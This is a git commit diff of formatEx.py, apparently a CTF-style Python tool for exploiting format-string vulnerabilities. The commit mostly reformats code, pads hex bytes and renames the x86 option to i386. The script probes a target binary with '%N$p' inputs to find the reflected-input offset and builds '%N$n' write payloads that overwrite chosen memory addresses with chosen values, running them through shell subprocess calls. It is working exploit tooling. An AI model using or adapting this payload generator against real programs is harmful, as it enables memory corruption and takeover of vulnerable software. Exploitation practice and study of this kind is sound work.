f6c563a91d2b1f645d736db49108a42b1da8f49c
Utkarsh Yadav <38191717+ViperX7@users.noreply.github.com>
2021-09-21 05:40:45 +0530

    formatStr :I might have fixed a 🐛 but might have introdused other| refactoring formatstr: making sure every byte is padded to 2 places

--- formatEx.py
+++ formatEx.py
@@ -13,7 +13,7 @@ def hexify(inp_bytes):
             out += hex(ord(x))[2:]
     elif type(inp_bytes) == bytes:
         for x in inp_bytes:
-            out += hex(x)[2:]
+            out += hex(x)[2:].rjust(2, "0")
     out = "0x" + out
     return out
 
@@ -42,19 +42,22 @@ def sanitize_where(where):
             exit()
     return addr
 
+
 # Helper function to interact with given binary
 # using stdin, arguments & environment
 
 
-def tbin(binary, pld,  method="stdin"):
+def tbin(binary, pld, method="stdin"):
     if method == "stdin":
-        res = subprocess.check_output(
-            "python2 -c 'print " + '"' + pld + '"' + "'" + "|" + binary, shell=True)
+        res = subprocess.check_output("python2 -c 'print " + '"' + pld + '"' +
+                                      "'" + "|" + binary,
+                                      shell=True)
     elif method == "args":
         res = subprocess.check_output(binary + " '" + pld + "'", shell=True)
     elif method == "env":
-        res = subprocess.check_output(
-            "python2 -c 'print " + '"' + pld + '"' + "'" + "| ./bin/format-three", shell=True)
+        res = subprocess.check_output("python2 -c 'print " + '"' + pld + '"' +
+                                      "'" + "| ./bin/format-three",
+                                      shell=True)
     return res
 
 
@@ -63,11 +66,12 @@ def tbin(binary, pld,  method="stdin"):
 def reflector(binary, attempts=100, method="stdin"):
     out = []
     for x in range(attempts):
-        pld = "A"*8 + " %" + str(x) + "$p"
+        pld = "A" * 8 + " %" + str(x) + "$p"
         res = tbin(binary, pld, method).decode('utf-8')
         if "4141414141414141" in res:
             out.append(x)
     return out
+
 
 # Todo : remove
 
@@ -79,23 +83,24 @@ def whr_pss(inp):
 
     HX = hex(HX)[2:]
 
-    HX_len = len(HX)//2
+    HX_len = len(HX) // 2
     while (HX_len % 4 != 0):
         HX = '00' + HX
         HX_len = len(HX) // 2
 
     for x in range(HX_len):
-        arr = chr(int(HX[2*x:2*(x+1)], 16))
+        arr = chr(int(HX[2 * x:2 * (x + 1)], 16))
         # print()
 
 
 # Format string design
 # cprinter writer padding address
 
+
 def cprinter(what):
     for x in range(len(what)):
         if x != 0:
-            what[-x] = what[-x] - what[-x-1]
+            what[-x] = what[-x] - what[-x - 1]
 
     for x in range(len(what)):
         if what[x] < 10:
@@ -126,14 +131,14 @@ def writer(c2print, steps, param_offset, ptr_size=8):
     while True:
         padding = ""
         next_param = param_offset
-        while(expected_length % ptr_size != 0):
+        while (expected_length % ptr_size != 0):
             padding += "A"
             expected_length += 1
 
         fmt = []
         for x in c2print:
-            fmt.append("%" + str(next_param + expected_length //
-                                 ptr_size) + "$" + bytes2write + "n")
+            fmt.append("%" + str(next_param + expected_length // ptr_size) +
+                       "$" + bytes2write + "n")
             next_param += 1
 
         pld = ""
@@ -148,6 +153,7 @@ def writer(c2print, steps, param_offset, ptr_size=8):
             # print(pld)
             return pld
 
+
 # takes care of size of given input and extra padding
 # to clear off exxess bytes (residue from previous value)
 
@@ -158,13 +164,13 @@ def prep_bytes(what, steps):
     split_bytes = []
     for p in range(len(what)):
         hx = what[p][2:]
-        while ((len(hx)//2) % 4 != 0):
+        while ((len(hx) // 2) % 4 != 0):
             hx = "00" + hx
-        hx_len = len(hx)//2
+        hx_len = len(hx) // 2
 
         split_byte = []
-        for x in range(hx_len//steps):
-            byte = int("0x" + hx[2 * x * steps: 2 * (x + 1) * steps], 16)
+        for x in range(hx_len // steps):
+            byte = int("0x" + hx[2 * x * steps:2 * (x + 1) * steps], 16)
             split_byte.append(byte)
         split_bytes.append(split_byte)
         final = sorted(final + split_byte)
@@ -179,14 +185,14 @@ def prep_bytes(what, steps):
     return final, order
 
 
-def write(content,  param_offset,  shift=0, context="compact", platform="amd64"):
+def write(content, param_offset, shift=0, context="compact", platform="amd64"):
     what = list(content.values())
     where = list(content.keys())
     addr = sanitize_where(where)
     if platform == "amd64":
         ptr_size = 8
         pack = p64
-    elif platform == "x86":
+    elif platform == "i386":
         pack = p32
         ptr_size = 4
 
@@ -199,20 +205,21 @@ def write(content,  param_offset,  shift=0, context="compact", platform="amd64")
     if context == "safe":
         steps = 1
     elif context == "risky" or int(max(what), 16) < 0xffff:
-        steps = 4       # 1, 2, 4
+        steps = 4  # 1, 2, 4
     else:
         steps = 2
 
     final, order = prep_bytes(what, steps)
+    print(order)
     print(final)
     min_final = min(final)
     for x in range(len(final)):
-        final[x] = final[x] - shift
+        final[x] = final[x]
 
     final = cprinter(final)
 
     fmt = writer(final, steps, param_offset, ptr_size)
-    fmt += '_'*(shift % ptr_size)
+    fmt += '_' * (shift % ptr_size)
     # print("=> " + fmt)
     fmt = fmt.encode()
 
@@ -250,16 +257,20 @@ if __name__ == "__main__":
     parser.add_argument("-w", "--write", help="Write to some location")
     parser.add_argument("-v", "--value", help="What to write")
     parser.add_argument("-l", "--loc", help="Where to write")
-    parser.add_argument(
-        "-o", "--offset", help="Parameter offset for reflected input")
-    parser.add_argument("-c", "--context",
+    parser.add_argument("-o",
+                        "--offset",
+                        help="Parameter offset for reflected input")
+    parser.add_argument("-c",
+                        "--context",
                         help="safe means stable, compact means small")
 
     parser.add_argument("-b", "--binary", help="Location of binary")
-    parser.add_argument(
-        "-i", "--method", help="Method to interact with binary")
+    parser.add_argument("-i",
+                        "--method",
+                        help="Method to interact with binary")
     parser.add_argument("-a", "--attempts", help="Number of offsets to test")
-    parser.add_argument("-p", "--preinput",
+    parser.add_argument("-p",
+                        "--preinput",
                         help="input required to reach printf")
 
     args = parser.parse_args()
